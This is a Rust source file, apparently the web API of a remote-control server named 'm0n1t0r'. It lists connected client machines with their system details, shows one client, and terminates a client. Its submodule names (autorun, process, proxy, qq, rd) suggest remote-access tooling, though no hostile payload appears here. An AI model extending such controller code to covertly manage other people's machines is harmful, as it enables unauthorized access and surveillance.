pub mod autorun;
pub mod environment;
pub mod fs;
pub mod network;
pub mod notification;
pub mod process;
pub mod proxy;
pub mod qq;
pub mod rd;
pub mod update;

use crate::{
    ServerMap,
    web::{Error, Response, Result as WebResult},
};
use actix_web::{
    Responder, delete, get,
    web::{Data, Json, Path},
};
use chrono::{DateTime, Local};
use m0n1t0r_common::{
    client::{Client as _, ClientClient, TargetPlatform},
    info,
};
use serde::Serialize;
use std::{net::SocketAddr, path::PathBuf, sync::Arc};
use tokio::{sync::RwLock, task::JoinSet};

#[derive(Serialize)]
pub struct Info {
    addr: SocketAddr,
    version: String,
    target_platform: TargetPlatform,
    system_info: info::System,
    build_time: String,
    commit_hash: String,
    current_exe: PathBuf,
    connected_time: DateTime<Local>,
}

impl Info {
    pub async fn new(addr: &SocketAddr, client: &ClientClient) -> WebResult<Self> {
        Ok(Self {
            addr: *addr,
            version: client.version().await?,
            target_platform: client.target_platform().await?,
            system_info: client.system_info().await?,
            build_time: client.build_time().await?,
            commit_hash: client.commit_hash().await?,
            current_exe: client.current_exe().await?,
            connected_time: client.connected_time().await?,
        })
    }
}

#[get("")]
pub async fn all(data: Data<Arc<RwLock<ServerMap>>>) -> WebResult<impl Responder> {
    let lock_map = data.read().await.map.clone();
    let details = Arc::new(RwLock::new(Vec::new()));
    let mut tasks = JoinSet::new();

    lock_map.into_iter().for_each(|(addr, server)| {
        let details = details.clone();
        tasks.spawn(async move {
            let lock_obj = server.read().await;
            let client = lock_obj.client()?;

            details.write().await.push(Info::new(&addr, client).await?);
            Ok::<_, Error>(())
        });
    });

    tasks
        .join_all()
        .await
        .into_iter()
        .collect::<Result<Vec<_>, _>>()?;
    Ok(Json(Response::success(&*details.read().await)?))
}

#[get("/{addr}")]
pub async fn get(
    data: Data<Arc<RwLock<ServerMap>>>,
    addr: Path<SocketAddr>,
) -> WebResult<impl Responder> {
    let lock_map = &data.read().await.map;
    let server = lock_map.get(&addr).ok_or(Error::NotFound)?;

    let lock_obj = server.read().await;
    let client = lock_obj.client()?;

    Ok(Json(Response::success(
        Info::new(lock_obj.addr(), client).await?,
    )?))
}

#[delete("/{addr}")]
pub async fn delete(
    data: Data<Arc<RwLock<ServerMap>>>,
    addr: Path<SocketAddr>,
) -> WebResult<impl Responder> {
    let lock_map = &data.read().await.map;
    let server = lock_map.get(&addr).ok_or(Error::NotFound)?;

    let lock_obj = server.read().await;
    let client = lock_obj.client()?;

    let _ = client.terminate().await;

    Ok(Json(Response::success(())?))
}
